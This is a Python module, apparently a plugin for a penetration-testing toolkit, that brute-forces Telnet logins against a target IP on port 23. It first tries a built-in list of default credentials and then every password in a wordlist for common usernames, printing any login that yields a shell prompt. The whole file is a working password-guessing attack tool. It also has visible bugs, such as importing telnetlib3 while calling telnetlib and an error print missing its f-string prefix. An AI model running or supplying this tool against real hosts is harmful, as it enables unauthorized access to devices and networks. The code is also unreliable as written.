import telnetlib3
import socket
import os
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from app.utility.colors import C

REQUIRED_OPTIONS = {"IP": "", "PASS": ""}

SYM_SUCCESS = "🔑"
SYM_FAILED = "🔒"


def test_telnet(target_ip, port, username, password):
    """
    Attempting Telnet login using telnetlib with prompt-based interaction.
    """
    try:
        # Flash connection
        tn = telnetlib.Telnet(target_ip, int(port), timeout=2.5)

        # Look for a login (e.g.: "login:")
        tn.read_until(b"login: ", timeout=1)
        tn.write(username.encode("ascii") + b"\n")

        # Look for a password prompt (e.g.: "Password:")
        tn.read_until(b"Password: ", timeout=1)
        tn.write(password.encode("ascii") + b"\n")

        # Read the response looking for a shell prompt ($ or #) as a sign of success.
        result = tn.read_until(b"$", timeout=1.5)
        result += tn.read_until(b"#", timeout=1.5)

        tn.close()

        # Verification: If a shell prompt is found, consider it successful.
        return b"$" in result or b"#" in result

    except (socket.timeout, socket.error, EOFError):
        return False
    except Exception:
        return False


def execute(options):
    """Operate BruteForce Telnet"""
    target_ip = options.get("IP")
    port = 23
    wordlist_path = options.get("PASS")

    print(f"{C.HEADER}--- TELNET BRUTE FORCE: {target_ip} ---")

    # ---------------------------------------------
    # Stage 1: Kredensial Default
    # ---------------------------------------------
    print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default")
    found_weak_creds = False

    try:
        for user, passwd in DEFAULT_CREDS:
            if test_telnet(target_ip, port, user, passwd):
                print(
                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{user} P:{passwd}"
                )
                found_weak_creds = True
                break
            print(f"{C.MENU}  {SYM_FAILED} FAIL: {user}:{passwd}")

        if found_weak_creds:
            return

        # ---------------------------------------------
        # Stage 2: Brute Force Wordlist
        # ---------------------------------------------
        if wordlist_path and os.path.exists(wordlist_path):
            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}")

            try:
                with open(wordlist_path, "r", encoding="latin-1") as f:
                    for target_user in COMMON_USERS:
                        f.seek(0)
                        for line in f:
                            passwd = line.strip()
                            if not passwd:
                                continue
                            if test_telnet(target_ip, port, target_user, passwd):
                                print(
                                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{target_user} P:{passwd}"
                                )
                                return
                            print(
                                f"{C.MENU}  [>] TRY: U:{target_user:<20} P:{passwd:<20}",
                                end="\r",
                                flush=True,
                            )

                    print(f"{C.MENU} [!] Brute Force finish.")

            except Exception as e:
                print(f"{C.ERROR}\n[!] ERROR: {e}")
        else:
            print(f"\n{C.MENU}  {SYM_FAILED} All passwords are incorrect.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        print("{C.ERROR}[x] GLOBAL ERROR: {e}")
